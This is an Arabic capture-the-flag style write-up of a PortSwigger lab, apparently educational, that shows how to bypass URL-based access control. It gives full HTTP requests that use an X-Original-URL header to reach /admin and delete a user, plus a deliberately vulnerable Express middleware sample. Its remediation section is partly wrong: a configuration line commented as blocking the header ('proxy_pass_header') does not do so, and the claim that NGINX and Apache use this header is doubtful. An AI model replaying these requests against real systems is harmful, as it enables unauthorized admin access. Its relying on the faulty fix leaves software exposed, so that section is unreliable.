# Lab: URL-based access control can be circumvented

> **Category:** Access Control  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

---

## 🎯 الهدف الرئيسي

تجاوز نظام التحكم في الوصول (Access Control) الأمامي (front-end) باستخدام هيدر `X-Original-URL`. النظام الأمامي يمنع الوصول المباشر إلى `/admin`، لكن النظام الخلفي (back-end) يستخدم هيدر `X-Original-URL` لتحديد المسار الفعلي.

**المطلوب:** الوصول إلى لوحة التحكم `/admin` وحذف المستخدم `carlos`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: محاولة الوصول إلى /admin مباشرة

- جرب زيارة `/admin`:

```
https://YOUR-LAB-ID.web-security-academy.net/admin
```

**النتيجة:** يتم حظر الوصول (403 Forbidden أو رد بسيط جداً).

- الرد البسيط يشير إلى أن الحظر يأتي من **نظام أمامي (front-end)** وليس من التطبيق الخلفي.

### الخطوة 2: اعتراض الطلب في Burp Repeater

- اعترض أي طلب عادي إلى الموقع
- أرسله إلى **Repeater**

### الخطوة 3: اختبار هيدر X-Original-URL

غيّر الطلب إلى:

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /invalid
```

**النتيجة:** الرد `404 Not Found` ✅

هذا يثبت أن **النظام الخلفي** يستخدم هيدر `X-Original-URL` لتحديد المسار الفعلي.

### الخطوة 4: استخدام X-Original-URL للوصول إلى /admin

غيّر الطلب إلى:

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin
```

**النتيجة:** ظهور صفحة الإدارة! ✅

النظام الأمامي يمنع `/admin` في المسار الأصلي، لكنه يسمح بمرور الهيدر.

### الخطوة 5: حذف المستخدم carlos

لحذف `carlos`، نحتاج إلى إرسال طلب إلى `/admin/delete?username=carlos`:

```http
GET /?username=carlos HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin/delete
```

### الخطوة 6: إرسال الطلب

- اضغط **Send**
- الطلب ينجح ✅

### الخطوة 7: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو X-Original-URL؟** | هيدر تستخدمه بعض الأطر (مثل NGINX, Apache) لتحديد المسار الأصلي للطلب بعد إعادة التوجيه |
| **أين الثغرة؟** | النظام الأمامي يمنع `/admin`، لكن النظام الخلفي يثق بـ `X-Original-URL` ويتجاهل المسار الأصلي |
| **كيف نستغلها؟** | نضع مساراً مسموحاً به في سطر الطلب (`/`)، والمسار الحقيقي في `X-Original-URL: /admin` |
| **لماذا نجحت؟** | front-end يمنع `/admin` فقط في سطر الطلب، لكنه لا يمنع الهيدر |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

تطابق غير صحيح بين نظام التحكم الأمامي والخلفي. front-end يمنع المسار، لكن back-end يثق بـ `X-Original-URL` ويتجاوز الحماية.

---

### ❌ Non-Compliant Code (Configuration)

```nginx
# Front-end configuration (NGINX) - خطأ
location /admin {
    deny all;
}

# Back-end application - يثق بـ X-Original-URL
# framework: Express.js مع middleware يقرأ X-Original-URL
app.use((req, res, next) => {
    const originalUrl = req.headers['x-original-url'];
    if (originalUrl) {
        req.url = originalUrl;
    }
    next();
});
```

---

### ✅ Compliant Code (Configuration)

```nginx
# Front-end configuration (NGINX) - إصلاح
# منع X-Original-URL القادمة من الخارج
proxy_set_header X-Original-URL "";

# أو منع الهيدر بالكامل
proxy_pass_header X-Original-URL;

# وبدلاً من ذلك، استخدم X-Forwarded-Path بحذر
```

```javascript
// Back-end - إصلاح: لا تثق بـ X-Original-URL من العميل
app.use((req, res, next) => {
    // التصحيح: استخدام المسار الأصلي من request line فقط
    // تجاهل X-Original-URL من العميل
    if (req.headers['x-original-url'] && !isTrustedProxy(req.ip)) {
        delete req.headers['x-original-url'];
    }
    next();
});
```

**الخلاصة:** 
1. لا تثق بـ `X-Original-URL` القادمة من العميل
2. تأكد من تطابق قواعد access control بين front-end و back-end
3. استخدم قائمة بيضاء للـ IPs الموثوقة

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **إزالة أو تجاهل `X-Original-URL`:** لا تستخدم هذا الهيدر من العميل.
2. **توحيد قواعد access control:** تأكد أن front-end و back-end متطابقان.
3. **استخدم trusted proxies فقط:** لا تقبل هيدرات إعادة التوجيه من مصادر غير موثوقة.
4. **التحقق من الصلاحية في back-end:** لا تعتمد فقط على front-end للحماية.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
- [X-Original-URL Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Original-URL)
- [Access Control Cheat Sheet](https://portswigger.net/web-security/access-control)
